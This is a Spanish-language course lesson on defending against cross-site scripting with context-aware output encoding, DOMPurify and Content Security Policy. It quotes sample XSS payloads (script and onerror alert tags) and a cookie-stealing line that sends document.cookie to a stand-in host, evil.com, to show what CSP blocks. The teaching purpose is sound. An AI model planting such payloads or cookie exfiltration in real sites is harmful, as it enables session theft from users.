# Objetivo 3 — Defensa en Profundidad (Output Encoding y CSP)

**Módulo IX · Cross-Site Scripting (XSS)**
**Curso Profesional de Ciberseguridad Web y Ethical Hacking — Software Seguro**
**Autora:** Sofía Lourdes Toledo Criado
**Fecha:** 2026-11-12

---

## 1. La idea: dos capas, no una

Contra XSS no alcanza con "una" defensa. La estrategia profesional es **defensa en profundidad**: poner **varias capas** de forma que, si una falla, otra atrapa el ataque. Para XSS, las dos capas fundamentales son:

1. **Output Encoding (Codificación de Salida)** — a nivel de **código**. Es la **mitigación principal**: evita que el XSS ocurra.
2. **Content Security Policy (CSP)** — a nivel de **cabeceras HTTP**. Es la **red de seguridad**: si un XSS igual se cuela, limita o impide que el código malicioso haga daño.

Las dos juntas hacen que explotar un XSS pase de "fácil" a "casi imposible". Veámoslas.

---

## 2. Capa 1 — Output Encoding (Codificación de Salida)

### Qué es
Es **convertir los caracteres especiales en sus "entidades HTML"** justo **antes** de mostrar el dato del usuario en la página. Así el navegador los dibuja como **texto visible**, no los interpreta como **código**.

La causa del XSS es que caracteres como `<`, `>`, `"`, `'` le dicen al navegador "acá empieza una etiqueta/atributo". Si los **codificamos**, pierden ese poder:

| Carácter | Se codifica como | El navegador lo muestra como… |
|---|---|---|
| `<` | `&lt;` | el símbolo `<` (texto, no inicio de etiqueta) |
| `>` | `&gt;` | el símbolo `>` |
| `"` | `&quot;` | una comilla doble (texto) |
| `'` | `&#x27;` | una comilla simple |
| `&` | `&amp;` | un ampersand |

### Cómo neutraliza el ataque
Si un atacante comenta `<script>alert(1)</script>` (o `<img src=x onerror=alert(1)>`), con output encoding el servidor lo guarda/muestra como:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

El navegador **dibuja el texto literal** `<script>alert(1)</script>` en la pantalla — el usuario **ve** esos caracteres como texto — pero **no ejecuta nada**, porque para el navegador eso ya **no es una etiqueta**, es una cadena de texto. El payload queda **desactivado**, sin importar qué mandó el atacante. A diferencia de la lista negra del Objetivo 1, esto **no intenta adivinar lo malo**: trata **todo** el input como texto inofensivo.

### El punto clave: codificar según el CONTEXTO
No se codifica igual en todos lados. El mismo dato es peligroso de forma distinta según **dónde** cae:

- En **HTML** (`<div>AQUÍ</div>`) → codificación de entidades HTML (`&lt;`, `&gt;`…).
- En un **atributo** (`<input value="AQUÍ">`) → codificar también comillas.
- En **JavaScript** (`var x = "AQUÍ";`) → codificación para contexto JS.
- En una **URL** (`href="AQUÍ"`) → URL encoding.

Codificar en el contexto equivocado deja huecos, por eso se usa **la codificación correcta para cada lugar** donde se inserta el dato.

### En la práctica: dejá que el framework lo haga
Los frameworks modernos hacen **output encoding automático** por defecto:
- **React** y **Angular** (lo que usamos en Farmacia Tienda) **auto-escapan** el contenido que renderizan. Por eso meter `{{ variable }}` en Angular o `{variable}` en React es seguro: el framework codifica solo.
- El peligro aparece cuando el programador **se saltea** esa protección: `innerHTML`, `dangerouslySetInnerHTML` (React), `[innerHTML]` o `bypassSecurityTrustHtml` (Angular). Ahí vuelve a ser responsabilidad del dev sanitizar.
- Para **HTML enriquecido** (editores WYSIWYG donde SÍ se quieren algunas etiquetas como `<b>`, `<i>`), no se codifica todo: se **sanitiza** con una librería robusta como **DOMPurify**, que deja las etiquetas seguras y elimina las peligrosas (`<script>`, `onerror`, `javascript:`).

> Output encoding es la **capa que impide que el XSS ocurra**. Es la mitigación #1. Pero, ¿y si en algún rincón el dev se olvidó de codificar? Para eso está la segunda capa.

---

## 3. Capa 2 — Content Security Policy (CSP)

### Qué es
CSP es una **cabecera HTTP** que el servidor manda al navegador con una **lista de reglas** sobre **qué recursos puede cargar y ejecutar** la página: desde qué orígenes se permiten scripts, estilos, imágenes, etc. Es una instrucción del tipo *"navegador, solo confiá en esto, bloqueá todo lo demás"*.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Esta regla dice: *"cargá scripts y recursos **solo desde mi propio dominio** (`'self'`), y nada más."*

### Cómo neutraliza (o limita) el XSS
CSP es la **defensa en profundidad**: asume que **un XSS podría colarse igual** (porque el dev se olvidó de codificar en algún lado) y **corta el daño**. Con una CSP bien armada:

1. **Bloquea scripts inline.** Un payload clásico de XSS es código **inline** inyectado en el HTML (`<script>...</script>` o `<img onerror="...">`). Una CSP con `script-src 'self'` (sin `'unsafe-inline'`) le dice al navegador: *"no ejecutes NINGÚN script que esté escrito directamente en el HTML, solo los que vengan de archivos de mi dominio"*. Resultado: aunque el atacante inyecte el `onerror=alert(1)`, **el navegador se niega a ejecutarlo**.

2. **Bloquea scripts de dominios externos.** El objetivo real de muchos XSS es **robar la cookie y mandarla al servidor del atacante** (`fetch('https://evil.com/log?c='+document.cookie)`). Con CSP, `evil.com` **no está en la lista de orígenes permitidos**, así que el navegador **bloquea la conexión** y la cookie nunca sale. El XSS, aunque se ejecute, **no puede filtrar los datos**.

3. **Permite reportes.** Con `report-uri` / `report-to`, cada violación de la política se **avisa** al servidor — funciona como **alerta temprana** de que alguien está intentando inyectar.

### Importante: CSP es complemento, NO reemplazo
CSP **no arregla** la vulnerabilidad: el input sigue sin estar codificado. Solo **reduce el impacto**. Además, una CSP mal configurada (con `'unsafe-inline'`, o `script-src *`) **no sirve de nada**. Por eso CSP es la **segunda** capa, nunca la única: primero codificás bien (capa 1), y CSP queda como **red de contención** por si algo falla.

### 🔍 Cómo verlo en el software
1. En **DevTools → Network → (la página) → Response Headers**, buscás la cabecera `Content-Security-Policy`.
   - **Señal buena:** existe y tiene `script-src 'self'` **sin** `'unsafe-inline'` ni `*`.
   - **Señal de riesgo:** no existe la cabecera, o incluye `'unsafe-inline'` / `script-src *` (CSP decorativa, no protege).
2. Para probar el output encoding: inyectás `<b>test</b>` en un campo y mirás el **código fuente** de la respuesta.
   - **Señal buena:** aparece **escapado** (`&lt;b&gt;test&lt;/b&gt;`) → el servidor codifica la salida.
   - **Señal de riesgo:** aparece como etiqueta real (texto en negrita) → falta encoding.

---

## 4. Cómo trabajan juntas (defensa en profundidad)

| | **Output Encoding (código)** | **CSP (cabeceras HTTP)** |
|---|---|---|
| **Dónde actúa** | En el servidor/plantilla, al renderizar | En el navegador, al cargar/ejecutar |
| **Qué hace** | Convierte el payload en texto inofensivo | Bloquea la ejecución y la fuga de datos |
| **Rol** | **Evita** que el XSS ocurra (capa principal) | **Limita el daño** si ocurre igual (red de seguridad) |
| **Si falla la otra capa…** | Si falla CSP, encoding igual bloqueó el XSS | Si faltó codificar en un lugar, CSP corta el daño |

El atacante tendría que vencer **las dos capas a la vez**: encontrar un punto **sin codificar** (para inyectar) **y además** una CSP que le permita ejecutar su script inline y conectarse a su servidor. Con las dos bien hechas, eso es **extremadamente difícil**. Esa es la esencia de la defensa en profundidad: **no apostar todo a una sola barrera.**

---

## 5. Conclusión

Un arquitecto de seguridad mitiga el XSS de forma definitiva **superponiendo dos capas**. La capa principal es el **Output Encoding**: codificar los caracteres especiales (`<`, `>`, `"`, `'`) a entidades HTML **según el contexto** (HTML, atributo, JS, URL) antes de renderizar, de modo que **cualquier** input del usuario se muestre como texto y **nunca** se interprete como código — lo hacen automáticamente frameworks como React/Angular, y para HTML enriquecido se sanitiza con DOMPurify. La segunda capa es la **Content Security Policy**: una cabecera HTTP que le ordena al navegador ejecutar scripts **solo** desde orígenes de confianza (`script-src 'self'`, sin `'unsafe-inline'`), de modo que si un XSS se cuela igual, el navegador **bloquea el script inline y la fuga de la cookie** hacia el servidor del atacante.

Ninguna capa por sí sola es perfecta: el encoding puede olvidarse en un rincón, y CSP no arregla la vulnerabilidad de fondo. Pero **juntas** se cubren mutuamente: para que el ataque funcione, el atacante tendría que derrotar a las dos al mismo tiempo. Eso es **defensa en profundidad**, y es la forma correcta de cerrar el riesgo de XSS.

---

*Fin del Objetivo 3 — Módulo IX.*
